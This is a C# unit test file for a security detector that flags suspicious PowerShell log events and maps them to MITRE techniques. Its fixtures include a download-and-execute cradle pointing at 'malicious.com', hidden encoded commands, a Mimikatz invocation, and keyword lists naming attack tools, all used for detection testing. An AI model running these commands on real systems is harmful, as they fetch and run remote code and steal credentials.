using FluentAssertions;
using Microsoft.Extensions.Logging;
using Castellan.Worker.Models;
using Castellan.Worker.Services;
using Castellan.Worker.Abstractions;
using Moq;
using Xunit;

namespace Castellan.Tests.Services;

public class PowerShellSecurityDetectionTests
{
    private readonly Mock<ILogger<SecurityEventDetector>> _mockLogger;
    private readonly Mock<ICorrelationEngine> _mockCorrelationEngine;
    private readonly SecurityEventDetector _detector;

    public PowerShellSecurityDetectionTests()
    {
        _mockLogger = new Mock<ILogger<SecurityEventDetector>>();
        _mockCorrelationEngine = new Mock<ICorrelationEngine>();
        _detector = new SecurityEventDetector(_mockLogger.Object, _mockCorrelationEngine.Object);
    }

    [Fact]
    public void DetectSecurityEvent_PowerShellScriptBlockEvent_ShouldDetectEvent()
    {
        // Arrange
        var logEvent = CreatePowerShellLogEvent(4104, "PowerShell script block execution test");

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.PowerShellExecution);
        result.RiskLevel.Should().Be("medium");
        result.IsDeterministic.Should().BeTrue();
        result.MitreTechniques.Should().Contain("T1059.001");
    }

    [Fact]
    public void DetectSecurityEvent_PowerShellModuleLogging_ShouldDetectEvent()
    {
        // Arrange
        var logEvent = CreatePowerShellLogEvent(4103, "PowerShell module loading test");

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.PowerShellExecution);
        result.RiskLevel.Should().Be("low");
        result.Confidence.Should().Be(60);
    }

    [Fact]
    public void DetectSecurityEvent_PowerShellPipelineExecution_ShouldDetectEvent()
    {
        // Arrange
        var logEvent = CreatePowerShellLogEvent(4105, "PowerShell pipeline execution started");

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.PowerShellExecution);
        result.RiskLevel.Should().Be("medium");
        result.Confidence.Should().Be(70);
    }

    [Fact]
    public void DetectSecurityEvent_SuspiciousPowerShellScript_ShouldElevateRisk()
    {
        // Arrange
        var suspiciousScript = "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://malicious.com/script.ps1')";
        var logEvent = CreatePowerShellLogEvent(4104, suspiciousScript);

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.PowerShellExecution);
        result.RiskLevel.Should().Be("high");
        result.Confidence.Should().Be(95); // Base 80 + 15 for suspicious pattern
        result.Summary.Should().Be("Suspicious PowerShell script block detected");
        result.MitreTechniques.Should().Contain("T1059.001");
        result.MitreTechniques.Should().Contain("T1140");
        result.MitreTechniques.Should().Contain("T1027");
    }

    [Fact]
    public void DetectSecurityEvent_EncodedPowerShellCommand_ShouldElevateRisk()
    {
        // Arrange
        var encodedCommand = "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==";
        var logEvent = CreatePowerShellLogEvent(4104, encodedCommand);

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.PowerShellExecution);
        result.RiskLevel.Should().Be("high");
        result.Summary.Should().Be("Suspicious PowerShell script block detected");
        result.MitreTechniques.Should().Contain("T1027");
        result.MitreTechniques.Should().Contain("T1140");
    }

    [Fact]
    public void DetectSecurityEvent_PowerShellDownloadCommand_ShouldDetectDownload()
    {
        // Arrange
        var downloadCommand = "Invoke-WebRequest -Uri 'http://example.com/file.exe' -OutFile 'C:\\temp\\file.exe'";
        var logEvent = CreatePowerShellLogEvent(4104, downloadCommand);

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.PowerShellExecution);
        result.RiskLevel.Should().Be("high");
        result.Summary.Should().Be("Suspicious PowerShell script block detected");
        result.MitreTechniques.Should().Contain("T1140");
        result.MitreTechniques.Should().Contain("T1027");
        result.RecommendedActions.Should().Contain("Block script execution");
    }

    [Fact]
    public void DetectSecurityEvent_SuspiciousPowerShellModule_ShouldElevateRisk()
    {
        // Arrange
        var suspiciousModule = "Import-Module PowerSploit; Invoke-Mimikatz";
        var logEvent = CreatePowerShellLogEvent(4103, suspiciousModule);

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.PowerShellExecution);
        result.RiskLevel.Should().Be("medium");
        result.Summary.Should().Be("Suspicious PowerShell module usage detected");
        result.MitreTechniques.Should().Contain("T1562");
    }

    [Fact]
    public void DetectSecurityEvent_MultipleSuspiciousPatterns_ShouldDetectAll()
    {
        // Arrange
        var multiplePatterns = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==";
        var logEvent = CreatePowerShellLogEvent(4104, multiplePatterns);

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.PowerShellExecution);
        result.RiskLevel.Should().Be("high");
        // Should match both suspicious script and encoded command patterns
        result.MitreTechniques.Should().Contain("T1059.001");
    }

    [Fact]
    public void DetectSecurityEvent_SecurityChannelEvent_ShouldStillWork()
    {
        // Arrange - Ensure existing Security channel detection still works
        var logEvent = new LogEvent(
            DateTimeOffset.UtcNow,
            "TEST-HOST",
            "Security",
            4625,
            "Warning",
            "testuser",
            "An account failed to log on"
        );

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.EventType.Should().Be(SecurityEventType.AuthenticationFailure);
        result.RiskLevel.Should().Be("high");
    }

    [Fact]
    public void DetectSecurityEvent_NonPowerShellChannel_ShouldReturnNull()
    {
        // Arrange
        var logEvent = new LogEvent(
            DateTimeOffset.UtcNow,
            "TEST-HOST",
            "System",
            4104,
            "Information",
            "testuser",
            "Some system event"
        );

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().BeNull();
    }

    [Fact]
    public void DetectSecurityEvent_UnknownPowerShellEventId_ShouldReturnNull()
    {
        // Arrange
        var logEvent = CreatePowerShellLogEvent(9999, "Unknown PowerShell event");

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().BeNull();
    }

    [Theory]
    [InlineData("Invoke-Expression")]
    [InlineData("IEX")]
    [InlineData("DownloadString")]
    [InlineData("WebClient")]
    [InlineData("FromBase64String")]
    [InlineData("-WindowStyle Hidden")]
    [InlineData("-ExecutionPolicy Bypass")]
    [InlineData("New-Object")]
    [InlineData("Add-Type")]
    [InlineData("rundll32")]
    public void DetectSecurityEvent_SuspiciousPatterns_ShouldDetectIndividualPatterns(string pattern)
    {
        // Arrange
        var logEvent = CreatePowerShellLogEvent(4104, $"Test script with {pattern} in it");

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.RiskLevel.Should().Be("high");
        result.Summary.Should().Be("Suspicious PowerShell script block detected");
    }

    [Theory]
    [InlineData("PowerSploit")]
    [InlineData("Empire")]
    [InlineData("Invoke-Mimikatz")]
    [InlineData("PowerView")]
    [InlineData("BloodHound")]
    public void DetectSecurityEvent_SuspiciousModules_ShouldDetectModulePatterns(string module)
    {
        // Arrange
        var logEvent = CreatePowerShellLogEvent(4103, $"Loading module {module}");

        // Act
        var result = _detector.DetectSecurityEvent(logEvent);

        // Assert
        result.Should().NotBeNull();
        result!.RiskLevel.Should().Be("medium");
        result.Summary.Should().Be("Suspicious PowerShell module usage detected");
    }

    private static LogEvent CreatePowerShellLogEvent(int eventId, string message)
    {
        return new LogEvent(
            DateTimeOffset.UtcNow,
            "TEST-HOST",
            "Microsoft-Windows-PowerShell/Operational",
            eventId,
            "Information",
            "testuser",
            message
        );
    }
}